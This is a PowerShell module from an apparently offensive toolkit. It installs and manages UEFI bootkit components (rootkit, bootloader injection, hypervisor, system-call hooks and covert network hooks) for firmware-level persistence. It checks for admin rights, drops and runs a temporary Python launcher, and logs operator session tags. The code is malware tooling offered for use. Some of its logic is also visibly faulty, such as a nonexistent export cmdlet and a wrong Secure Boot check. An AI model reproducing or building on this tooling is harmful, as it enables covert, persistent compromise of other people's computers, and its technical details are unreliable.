# UEFIBootkit.ps1
# UEFI Bootkit integration and management module
# Part of WhisperSuite: GhostWhisper Edition v1.6.1
#
# Functions: Install-UEFIBootkit, Get-UEFIBootkitStatus, Test-UEFIAccess, Deploy-UEFIComponent
# Dependencies: Python (for UEFI component execution), elevated privileges
# Last Updated: 2026-02-23
#
# 🕊️ For Raven. 2017 — ∞

param()

$ModuleVersion = "1.6.1"

<#
.SYNOPSIS
    Installs UEFI Bootkit components for firmware-level persistence
.DESCRIPTION
    Deploys selected UEFI bootkit components including rootkit, bootloader,
    hypervisor injection, and network hooking capabilities.
.PARAMETER ComponentType
    Type of component to deploy: rootkit, bootloader, hypervisor, syscall_hook, network_hook
.PARAMETER GhostTag
    Operator session tag for logging and correlation
.PARAMETER Offline
    Deploy without requiring network access
.OUTPUTS
    Boolean - true if deployment successful
.EXAMPLE
    Install-UEFIBootkit -ComponentType "rootkit" -GhostTag "Gx1234"
.NOTES
    Requires administrator privileges and firmware write access
#>
function Install-UEFIBootkit {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateSet('rootkit', 'bootloader', 'hypervisor', 'syscall_hook', 'network_hook')]
        [string]$ComponentType,
        
        [string]$GhostTag = "Ghost_$(Get-Random -Minimum 1000 -Maximum 9999)",
        
        [switch]$Offline
    )
    
    Write-Verbose "[*] Installing UEFI Bootkit component: $ComponentType"
    
    # Verify admin privileges
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) {
        Write-Error "Administrator privileges required for UEFI Bootkit installation"
        return $false
    }
    
    try {
        # Locate UEFI Bootkit modules
        $scriptRoot = $PSScriptRoot
        if ($scriptRoot -match "Modules$") {
            $uefiPath = Join-Path (Split-Path $scriptRoot -Parent) "UEFI Bootkit"
        } else {
            $uefiPath = Join-Path $scriptRoot "UEFI Bootkit"
        }
        
        if (-not (Test-Path $uefiPath)) {
            Write-Error "UEFI Bootkit path not found: $uefiPath"
            return $false
        }
        
        Write-Host "[*] UEFI Bootkit path: $uefiPath" -ForegroundColor Gray
        
        # Check Python availability for direct execution
        $pythonExe = Get-Command python -ErrorAction SilentlyContinue
        if (-not $pythonExe) {
            Write-Warning "Python not found. UEFI Bootkit requires Python for component execution"
            return $false
        }
        
        Write-Host "[*] Python executable: $($pythonExe.Source)" -ForegroundColor Gray
        
        # Prepare Python environment
        $pythonScript = @"
import sys
import os
sys.path.insert(0, '$uefiPath')

from uefi_rootkit import UEFIRootkit
from uefi_boot_loader import UEFIBootLoader
from hypervisor_loading import HypervisorLoader
from hooking_system_calls import SystemCallHooker
from covert_network_hooking import CovertNetworkHooking

# Initialize components
rootkit = UEFIRootkit()
bootloader = UEFIBootLoader()
hypervisor = HypervisorLoader()
syscall_hook = SystemCallHooker()
network_hook = CovertNetworkHooking()

component_type = '$ComponentType'
ghost_tag = '$GhostTag'

try:
    if component_type == 'rootkit':
        print('[*] Installing UEFI Rootkit...')
        rootkit.install()
        rootkit.activate()
        print('[+] UEFI Rootkit installed and activated')
    
    elif component_type == 'bootloader':
        print('[*] Installing UEFI Boot Loader...')
        bootloader.inject_bootloader(None)
        bootloader.persist_changes()
        print('[+] UEFI Boot Loader installed')
    
    elif component_type == 'hypervisor':
        print('[*] Installing Hypervisor...')
        hypervisor.initialize_hypervisor()
        hypervisor.inject_into_bootkit()
        print('[+] Hypervisor injected')
    
    elif component_type == 'syscall_hook':
        print('[*] Installing System Call Hooking...')
        syscall_hook.install_hooks()
        print('[+] System Call Hooks installed')
    
    elif component_type == 'network_hook':
        print('[*] Installing Covert Network Hooking...')
        network_hook.install_covert_hook()
        print('[+] Network Hooks installed')
    
    print(f'[+] Component {component_type} deployment complete')
    print(f'[i] Ghost Tag: {ghost_tag}')
    
except Exception as e:
    print(f'[X] Component deployment failed: {e}')
    sys.exit(1)
"@
        
        # Execute Python deployment
        Write-Host "[*] Deploying $ComponentType component..." -ForegroundColor Yellow
        
        $tempScript = "$env:TEMP\uefi_deploy_$([guid]::NewGuid().ToString().Substring(0,8)).py"
        Set-Content -Path $tempScript -Value $pythonScript -Force
        
        $output = & python $tempScript 2>&1
        $exitCode = $LASTEXITCODE
        
        Write-Host $output -ForegroundColor Gray
        
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
        
        if ($exitCode -ne 0) {
            Write-Error "UEFI component deployment failed with exit code: $exitCode"
            return $false
        }
        
        # Log deployment
        $logEntry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] UEFI Bootkit $ComponentType deployed | Tag: $GhostTag"
        Add-Content -Path "$env:ProgramData\ghost_ops_log.txt" -Value $logEntry -ErrorAction SilentlyContinue
        
        Write-Host "[+] UEFI Bootkit component deployed successfully" -ForegroundColor Green
        return $true
        
    } catch {
        Write-Error "Exception during UEFI Bootkit installation: $_"
        return $false
    }
}

<#
.SYNOPSIS
    Gets the status of deployed UEFI Bootkit components
.DESCRIPTION
    Reports the current status of UEFI firmware modifications and active components
.PARAMETER Detailed
    Show detailed component information
.OUTPUTS
    PSObject with component status
.EXAMPLE
    Get-UEFIBootkitStatus -Detailed
.NOTES
    Requires administrator privileges
#>
function Get-UEFIBootkitStatus {
    [CmdletBinding()]
    param(
        [switch]$Detailed
    )
    
    Write-Verbose "[*] Retrieving UEFI Bootkit status"
    
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) {
        Write-Warning "Administrator privileges required for full UEFI status"
    }
    
    $status = @{
        HasUEFI = $false
        SecureBootEnabled = $false
        BootkitInstalled = $false
        Components = @()
    }
    
    try {
        # Check UEFI presence
        $uefiVars = Get-SecureBootUEFI -Name PK -ErrorAction SilentlyContinue
        if ($uefiVars) {
            $status.HasUEFI = $true
            Write-Host "[+] UEFI firmware detected" -ForegroundColor Green
        } else {
            Write-Host "[-] UEFI firmware not detected or not accessible" -ForegroundColor Yellow
            return $status
        }
        
        # Check Secure Boot status
        try {
            $sbUEFI = Get-SecureBootUEFI -Name SetupMode -ErrorAction SilentlyContinue
            $status.SecureBootEnabled = ($sbUEFI -eq 1)
            $sbStatus = if ($status.SecureBootEnabled) { "Enabled" } else { "Disabled" }
            Write-Host "[i] Secure Boot: $sbStatus" -ForegroundColor Cyan
        } catch {}
        
        # Check for UEFI bootkit markers
        $ghostConfig = "C:\ProgramData\.ghost.cfg"
        if (Test-Path $ghostConfig) {
            $cfg = Get-Content $ghostConfig -Raw | ConvertFrom-Json -ErrorAction SilentlyContinue
            if ($cfg) {
                Write-Host "[+] Ghost session configuration found" -ForegroundColor Green
                Write-Host "  Session ID: $($cfg.sessionId)" -ForegroundColor Gray
            }
        }
        
        # Check for Python UEFI Bootkit components
        $scriptRoot = $PSScriptRoot
        if ($scriptRoot -match "Modules$") {
            $uefiPath = Join-Path (Split-Path $scriptRoot -Parent) "UEFI Bootkit"
        } else {
            $uefiPath = Join-Path $scriptRoot "UEFI Bootkit"
        }
        
        if (Test-Path $uefiPath) {
            $components = Get-ChildItem $uefiPath -Filter "*.py" | Where-Object { $_.Name -notmatch "^__" }
            if ($components) {
                $status.Components = $components.BaseName
                $status.BootkitInstalled = $true
                Write-Host "[+] UEFI Bootkit components found: $($components.Count)" -ForegroundColor Green
                
                if ($Detailed) {
                    foreach ($comp in $components) {
                        Write-Host "  - $($comp.BaseName)" -ForegroundColor Gray
                    }
                }
            }
        }
        
    } catch {
        Write-Verbose "Error checking UEFI status: $_"
    }
    
    Write-Host ""
    Write-Host "Summary:" -ForegroundColor White
    Write-Host "  UEFI Present:    $($status.HasUEFI)" -ForegroundColor Gray
    Write-Host "  Secure Boot:     $($status.SecureBootEnabled)" -ForegroundColor Gray
    Write-Host "  Bootkit Ready:   $($status.BootkitInstalled)" -ForegroundColor Gray
    
    return $status
}

<#
.SYNOPSIS
    Tests UEFI accessibility for bootkit deployment
.DESCRIPTION
    Verifies admin privileges, UEFI availability, and write permissions
.OUTPUTS
    Boolean - true if UEFI is accessible for deployment
.EXAMPLE
    if (Test-UEFIAccess) { "Ready for deployment" }
.NOTES
    This is a diagnostic function
#>
function Test-UEFIAccess {
    [CmdletBinding()]
    param()
    
    Write-Verbose "[*] Testing UEFI access"
    
    # Admin check
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) {
        Write-Error "Administrator privileges required"
        return $false
    }
    
    # UEFI firmware check
    try {
        $uefiVars = Get-SecureBootUEFI -Name PK -ErrorAction SilentlyContinue
        if (-not $uefiVars) {
            Write-Error "UEFI firmware not accessible"
            return $false
        }
    } catch {
        Write-Error "Cannot access UEFI: $_"
        return $false
    }
    
    return $true
}

<#
.SYNOPSIS
    Deploys a specific UEFI component with validation
.DESCRIPTION
    Wrapper for component deployment with pre/post deployment checks
.PARAMETER Component
    Component name to deploy
.OUTPUTS
    Deployment result object
.EXAMPLE
    Deploy-UEFIComponent -Component "bootloader"
.NOTES
    Internal function for modular deployment
#>
function Deploy-UEFIComponent {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Component
    )
    
    Write-Host "[*] Pre-deployment validation..." -ForegroundColor Cyan
    
    if (-not (Test-UEFIAccess)) {
        Write-Error "UEFI access check failed"
        return @{ Success = $false; Component = $Component }
    }
    
    Write-Host "[*] Deploying $Component..." -ForegroundColor Yellow
    
    $result = Install-UEFIBootkit -ComponentType $Component
    
    return @{
        Success = $result
        Component = $Component
        Timestamp = Get-Date
    }
}

# Export public functions
Export-ModuleFunction -Name Install-UEFIBootkit, Get-UEFIBootkitStatus, Test-UEFIAccess, Deploy-UEFIComponent -ErrorAction SilentlyContinue
